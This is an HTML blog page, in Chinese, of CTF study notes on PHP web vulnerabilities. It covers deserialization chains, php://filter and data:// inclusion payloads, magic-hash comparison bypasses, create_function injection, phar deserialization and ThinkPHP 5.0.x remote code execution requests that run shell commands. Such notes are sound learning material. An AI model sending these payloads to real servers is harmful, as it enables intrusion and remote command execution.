@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            php
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">php</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2022-09-16
+                        </span>
+                        
+                            <span id="/2022/09/16/php/" class="leancloud_visitors" data-flag-title="php">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2022/09/16/php/"></span>
+                        </span>  
+                    </p>
+                    
+                    
+                        
+                            <span class="tag-color">ctfknowledge</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="php知识点总结"><a href="#php知识点总结" class="headerlink" title="php知识点总结"></a>php知识点总结</h1><h3 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​&lt;? echo &#x27;123&#x27;;?&gt; #前提是开启配置参数short_open_tags=on​​</span><br><span class="line"></span><br><span class="line">​&lt;script language=&quot;php&quot;&gt;echo &#x27;hello&#x27;; #不需要修改参数开关，但是只能在7.0以下可用。​​</span><br><span class="line"></span><br><span class="line">​&lt;% echo &#x27;123&#x27;;%&gt; #开启配置参数asp_tags=on，并且只能在7.0以下版本使用​​</span><br></pre></td></tr></table></figure>
+
+<p>使用第二种，html里面可以利用<code>%09</code>绕过空格</p>
+<h3 id="php7-3-2漏洞"><a href="#php7-3-2漏洞" class="headerlink" title="php7.3.2漏洞"></a>php7.3.2漏洞</h3><ul>
+<li>php7.3.2 require_once 绕过不能重复包含文件的限制 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a><blockquote>
+<p><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
+</blockquote>
+</li>
+<li>反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果</li>
+</ul>
+<h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>反序列化魔术方法</p>
+<ul>
+<li>__construct()&#x2F;&#x2F;当一个对象创建时被调用</li>
+<li>__destruct() &#x2F;&#x2F;当一个对象销毁时被调用</li>
+<li>__toString() &#x2F;&#x2F;当一个对象被当作一个字符串使用</li>
+<li>__sleep()&#x2F;&#x2F;在对象在被序列化之前运行</li>
+<li>__wakeup()&#x2F;&#x2F;将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</li>
+<li>__get()&#x2F;&#x2F;获得一个类的成员变量时调用 获得一个不存在的变量的时候调用</li>
+<li>__set()&#x2F;&#x2F;设置一个类的成员变量时调用</li>
+<li>__invoke()&#x2F;&#x2F;调用函数的方式调用一个对象时的回应方法</li>
+<li>__call()&#x2F;&#x2F;当调用一个对象中的不能用的方法的时候就会执行这个函数</li>
+<li>__isset()&#x2F;&#x2F;当对不可访问属性调用isset()或empty()时调用</li>
+<li>__clone()&#x2F;&#x2F;当对象复制完成时调用</li>
+<li>protected属性赋值最好直接往类里面赋值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var = &quot;/flag&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class syc</span><br><span class="line">&#123;</span><br><span class="line">    public $cuit;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo(&quot;action!&lt;br&gt;&quot;);</span><br><span class="line">        $function=$this-&gt;cuit;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class lover</span><br><span class="line">&#123;</span><br><span class="line">    public $yxx;</span><br><span class="line">    public $QW;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo(&quot;invoke!&lt;br&gt;&quot;);</span><br><span class="line">        return $this-&gt;yxx-&gt;QW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web</span><br><span class="line">&#123;</span><br><span class="line">    public $eva1;</span><br><span class="line">    public $interesting;</span><br><span class="line"></span><br><span class="line">    public function __get($var)</span><br><span class="line">    &#123;</span><br><span class="line">        echo(&quot;get!&lt;br&gt;&quot;);</span><br><span class="line">        $eva1=$this-&gt;eva1;</span><br><span class="line">        $eva1($this-&gt;interesting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new syc();</span><br><span class="line">$b = new lover();</span><br><span class="line">$c = new web();</span><br><span class="line"></span><br><span class="line">$a-&gt;cuit = $b;</span><br><span class="line">$b-&gt;yxx = $c;</span><br><span class="line">$b-&gt;QW = $var;</span><br><span class="line">$c-&gt;eval = &#x27;system&#x27;;</span><br><span class="line">$c-&gt;interesting = &#x27;cat /flag&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007250604">php反序列化魔术函数详解</a></p>
+<blockquote>
+<p>在 php 面向对象编程中，类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 __get()。</p>
+</blockquote>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="php伪协议介绍"><a href="#php伪协议介绍" class="headerlink" title="php伪协议介绍"></a>php伪协议介绍</h4><ul>
+<li>file:&#x2F;&#x2F; 访问本地文件系统</li>
+<li>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流</li>
+<li>data:&#x2F;&#x2F; 数据</li>
+<li>zip:&#x2F;&#x2F; 压缩流 不过有些伪协议需要allow_url_fopen和allow_url_include的支持。</li>
+<li>allow_url_fopen On&#x2F;Off 允许或禁止打开URL文件</li>
+<li>allow_url_include On&#x2F;Off 允许或禁止引用URL文件</li>
+</ul>
+<h4 id="协议使用条件和方式"><a href="#协议使用条件和方式" class="headerlink" title="协议使用条件和方式"></a>协议使用条件和方式</h4><blockquote>
+<ol>
+<li>php:&#x2F;&#x2F;协议<br>条件:<br>allow_url_fopen:off&#x2F;on<br>allow_url_include :仅php:&#x2F;&#x2F;input php:&#x2F;&#x2F;stdin php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp 需要on</li>
+</ol>
+</blockquote>
+<p>作用:<br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php:&#x2F;&#x2F;filter和php：&#x2F;&#x2F;input，<br>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码。</p>
+<p>使用 <code>?file=file:// </code> </p>
+<blockquote>
+<ol start="2">
+<li>php:&#x2F;&#x2F;filter伪协议<br>条件：<br>allow_url_fopen&#x3D;on&#x2F;off<br>allow_url_include&#x3D;on&#x2F;off</li>
+</ol>
+</blockquote>
+<p>使用<code>?file=php://filter/read=convert.base64-encode/resource=xx.php</code></p>
+<blockquote>
+<ol start="3">
+<li>php:&#x2F;&#x2F;input（读取POST数据）<br>条件：<br>allow_url_fopen&#x3D;on&#x2F;off<br>allow_url_include&#x3D;on</li>
+</ol>
+</blockquote>
+<p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的</p>
+<blockquote>
+<ol start="4">
+<li>file伪协议<br>条件：</li>
+</ol>
+</blockquote>
+<p>eg: 使用file:&#x2F;&#x2F;伪协议去包含本地的phpinfo.php和flag.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=file://E:\phpinfo.php</span><br><span class="line">?file=../flag.txt</span><br><span class="line">?file=http://127.0.0.1/flag.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ol start="5">
+<li>phar:&#x2F;&#x2F;伪协议(读取压缩包文件内容)<br>条件：</li>
+</ol>
+</blockquote>
+<p>作用:</p>
+<p>使用&#96;&#96;</p>
+<blockquote>
+<ol start="6">
+<li>压缩文件伪协议<br>条件：</li>
+</ol>
+</blockquote>
+<p>作用:</p>
+<p>使用&#96;&#96;</p>
+<blockquote>
+<ol start="7">
+<li>data协议<br>需要allow_url_include和allow_url_fopen都为On<br>data:&#x2F;&#x2F;伪协议是数据流封装器，传递相应格式的数据。 通常可以用来执行PHP代码。</li>
+</ol>
+</blockquote>
+<p>使用<code>data://text/plain, data://text/plain;base64,</code></p>
+<p>eg:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">include $cmd;</span><br><span class="line">?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ol start="8">
+<li>php:&#x2F;&#x2F;filter伪协议<br>远程包含需要allow_url_fopen和allow_url_include都为On。<br>允许通过HTTP 1.0的GET方法，以只读的方式访问文件或者资源。 CTF中通常用于远程包含。</li>
+</ol>
+</blockquote>
+<p>使用<code>?file=http:/127.0.0.1/phpinfo.txt</code></p>
+<h4 id="部分练习"><a href="#部分练习" class="headerlink" title="部分练习"></a>部分练习</h4><ul>
+<li>php伪协议，一般用于当tp ， ..&#x2F;,和data和input被禁用的情况，可以用于读取网站源文件<br>格式：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]<br>php:&#x2F;&#x2F;input     data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64;________(编码) (data伪协议)<br>输入想要执行的系统命令的编码<br>例：<a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</a></li>
+</ul>
+<p>列出来的可能是编码的格式，解码一下就可以查看源码</p>
+<h3 id="函数漏洞"><a href="#函数漏洞" class="headerlink" title="函数漏洞"></a>函数漏洞</h3><ul>
+<li><p><code>include()</code>函数可以使用?file&#x3D;<code>php://filter/read=convert.base64-encode/resource=phpinfo.php</code>直接读取文件</p>
+</li>
+<li><p><code>include</code>命令执行<code>data://text/plain/;base64,________(编码)</code></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = data:text/plain/;base64,PD9waHAgcGhwaW5mbygpPz4=; #phpinfo() </span><br><span class="line">include $data;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>file_get_contents($text,&#39;r&#39;)</code>这种只读函数可以使用 <code>data://text/plain/;base64,________(编码)</code> (data伪协议)这个伪协议可以把你的代码包装，相当于一个文件，然后&#96;file_get_contents($text,’r’)&#96;&#96;就会读取这个文件，你可以控制这个文件的内容从而绕过</li>
+</ul>
+<p>文件上传漏洞<br>file_put_contents(‘webshell.php’,’一句话木马’);</p>
+<ul>
+<li><p>basename()会把字符串之中非acsii码的东西删掉，可以利用中文.</p>
+</li>
+<li><p>弱比较：字母和数字字符自动变为数字，如<code> $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</code>，比较时，$str&#x3D;123.</p>
+</li>
+<li><p>intval（）函数：<br>intval()函数会保留科学计数法前面的数，例如2e10 经过intval()处理将会变成 2 但是2e10+1 处理之后 因为加了1所以会是 20000000001</p>
+</li>
+</ul>
+<blockquote>
+<p><code>intval(&#39;4476.0&#39;)===4476    小数点  </code><br><code>intval(&#39;+4476.0&#39;)===4476   正负号</code><br><code>intval(&#39;4476e0&#39;)===4476    科学计数法</code><br><code>intval(&#39;0x117c&#39;)===4476    16进制</code><br><code>intval(&#39;010574&#39;)===4476    8进制</code><br><code>intval(&#39; 010574&#39;)===4476   8进制+空格</code></p>
+</blockquote>
+<p>Intval函数获取变量整数数值<br>Intval最大的值取决于操作系统。<br>32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。<br>32位系统上， intval(‘1000000000000’) 会返回 2147483647。<br>64 位系统上，最大带符号的 integer 值是 9223372036854775807。<br>所以如果参数为2147483647，那么当它反过来（就是字面意思），由于超出了限制，所以依然等于2147483647，即为回文。<br>is_numeric() 判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以<br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。<br>所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！<br>该函数还可能造成sql注入，例如将’1 or 1’转换为16进制形式2731206f72203127，再传参，就可以造成sql注入。<br><code>intval(req[&quot;number&quot;])=intval(strrev(req[&quot;number&quot;])=intval(strrev(req[&quot;number&quot;])=intval(strrev(req[“number”]))</code><br>如果要求不是回文，但又要满足这个条件，<br>可以用科学计数法构造<code>0=0</code>：<br><code>number=0e-0%00</code></p>
+<ul>
+<li><p>$_GET[‘x’]传入的x值会进行url解码，可以利用 取反 绕过preg_match()函数</p>
+</li>
+<li><p>is_numeric()函数可以直接加字母来绕过</p>
+</li>
+<li><p>extract();这个函数会有变量覆盖的漏洞。函数是从数组中把变量导入到当前的符号表中。</p>
+</li>
+<li><p><code>trim()</code>和<code>is_numberic()</code>导致的函数判断错误<code>%0c</code>绕过</p>
+</li>
+<li><p><code>if ($_GET[&quot;P0ST1&quot;] != $_GET[&quot;P0ST2&quot;])&#123;  if (($_GET[&quot;P0ST1&quot;]) == md5($_GET[&quot;P0ST2&quot;]))&#123;          $f1=$flag1;          echo &quot;小蓝鲨成功一半&quot;.$f1;                    &#125;  &#125;</code></p>
+</li>
+</ul>
+<blockquote>
+<p><code>P0ST1=0e462097431906509019562988736854&amp;P0ST2=240610708</code></p>
+</blockquote>
+<p>md5和sha1想要相同都是使得结果为<code>0e</code>开头</p>
+<ul>
+<li><code>if($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))</code></li>
+</ul>
+<blockquote>
+<p><code>a=240610708&amp;b=s878926199a </code></p>
+</blockquote>
+<ul>
+<li><code>if((string)$_POST[&#39;c&#39;] != (string)$_POST[&#39;d&#39;] &amp;&amp; sha1($_POST[&#39;c&#39;]) === sha1($_POST[&#39;d&#39;]))</code></li>
+</ul>
+<blockquote>
+<p>&#96;&#96;</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a = &#x27;Original&#x27;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a;</span><br><span class="line">\$b = $b;</span><br><span class="line">\$c = $c&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">输出：</span><br><span class="line">$a = Cat;</span><br><span class="line">$b = Dog;</span><br><span class="line">$c = Horse</span><br></pre></td></tr></table></figure>
+<p>假设里面是post传值,我们post一个 <code>a=&quot;like&quot;&amp;b=&quot;love&quot;</code><br>就会导致 <code>$a=&quot;like&quot; $b=&quot;love&quot;</code></p>
+<h5 id="create-function函数利用"><a href="#create-function函数利用" class="headerlink" title="create_function函数利用"></a>create_function函数利用</h5><p>create_function函数会创建一个匿名函数。</p>
+<p>create_function(string $args, string $code)<br>​<br>string $args   声明的函数变量部分</p>
+<p>string $code   执行的方法代码部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">$a(&#x27;&#x27;, $b);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=create_function&amp;b=&#125;system(&#x27;cat /flag&#x27;); /*</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reate_function创建的函数就会变成</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">function lambda_1() &#123;</span><br><span class="line">&#125;system(&#x27;cat /flag&#x27;);</span><br><span class="line">/*&#125; 这里会被注释掉</span><br></pre></td></tr></table></figure>
+
+<h3 id="php魔术变量"><a href="#php魔术变量" class="headerlink" title="php魔术变量"></a>php魔术变量</h3><ul>
+<li>$_SERVER[‘REMOTE_ADDR’]当前目录位置</li>
+<li>$_SERVER[‘QUERY_STRING’]的值为URL中?之后的字符串</li>
+<li>$_SERVER[‘PHP_SELF’]表示网站根目录地址</li>
+</ul>
+<h3 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h3><h5 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h5><ul>
+<li>thinkphp5.0.0</li>
+<li>thinkphp5.0.20</li>
+</ul>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>
+
+<h5 id="Thinkphp5-0-23变量覆盖RCE"><a href="#Thinkphp5-0-23变量覆盖RCE" class="headerlink" title="Thinkphp5.0.23变量覆盖RCE"></a>Thinkphp5.0.23变量覆盖RCE</h5><ul>
+<li>thinkphp5.0.23<br> poc <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><code>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=-1</code><br>执行phpinfo()</p>
+<h5 id="thinkphp6-0-0任意文件写入"><a href="#thinkphp6-0-0任意文件写入" class="headerlink" title="thinkphp6.0.0任意文件写入"></a>thinkphp6.0.0任意文件写入</h5><ul>
+<li>thinkphp 6.0.0  (thinkphp6.0.0~thinkphp6.0.1)</li>
+<li>php 7.4.3</li>
+</ul>
+<p>poc </p>
+<ul>
+<li>漏洞分析</li>
+</ul>
+<p>根据官方文档,session的隐患,推断应该是存储sesssion的时候出现了问题,导致文件写入</p>
+<p>再session的存储.php文件上找到了<code> $this-&gt;handler-&gt;write($sessionId, $data);</code></p>
+<p>最好可以使用全局搜索,查找那些地方可以进行文件写入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128161616.png" alt="20231128161616"></p>
+<p>然后跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128162531.png" alt="20231128162531"><br>再次定位这个</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128162755.png" alt="20231128162755"><br>写入文件的操作，现在就来看如何控制变量的输入,查看文件名是否可以控制，$path 是由 $sesssionId来控制 通过getId()可以传入参数 getId()又可以通过setId()来控制$this-&gt;id</p>
+<p>当传入的参数$id满足32位的长度时，就将该值设为$this-&gt;id。看一下调用setId的地方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128164253.png" alt="20231128164253"></p>
+<p>继续跟进,搜索到两个地方调用这个函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128164718.png" alt="20231128164718"></p>
+<p>cookiename的值由$this-&gt;session-&gt;getName()控制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20231128165047.png" alt="20231128165047"></p>
+<p>cookiename的值就是传入的phpsession的值</p>
+<p>接下来查看文件内容是否可控，写入的内容就是创建session使用的内容。但是session的创建是由实际的后端业务逻辑来决定的，而默认环境下并没有创建session。因此，默认环境下无法做到任意文件写入。</p>
+<p>因为$sessionId的可控，我们同样也可以利用这个点删除文件</p>
+<h5 id="Thinkphp6-0-12LTS反序列化漏洞"><a href="#Thinkphp6-0-12LTS反序列化漏洞" class="headerlink" title="Thinkphp6.0.12LTS反序列化漏洞"></a>Thinkphp6.0.12LTS反序列化漏洞</h5><ul>
+<li>Thinkphp6.0.12LTS</li>
+<li>PHP7.4.3</li>
+</ul>
+<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">详解文章</a></li>
+</ul>
+<p><b>利用格式</b></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot; __HALT_COMPILER(); &quot;); //设置stub</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest(存入的$0会被序列化储存)</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>可以在<code>$phar-&gt;setMetadata($o);</code>的前面来构建任意位置构建总结的反序列化.</p>
+<p><b>利用条件</b></p>
+<blockquote>
+<ol>
+<li>php文件要能够上传到服务器端。</li>
+<li>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤。</li>
+</ol>
+</blockquote>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/-f128e7dd768b5.jpg" alt="懒羊羊">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>懒羊羊
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2022/09/16/php/" target="_blank">php</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tags/ctfknowledge/">ctfknowledge</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/2022/09/16/hexo-github%E6%8C%87%E4%BB%A4/" class="prev-prefix">« </a> 上一篇：    <a href="/2022/09/16/hexo-github%E6%8C%87%E4%BB%A4/" title="发布于 2022-09-16 09:51">hexo+github指令</a>
+                        <br>
+                    
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
+    
+</div>
+    <div id="footer"></div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>简单地活着，肆意而又精彩！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/-f128e7dd768b5.jpg">
+                </div> 
+                <div class="introduce-info"> 
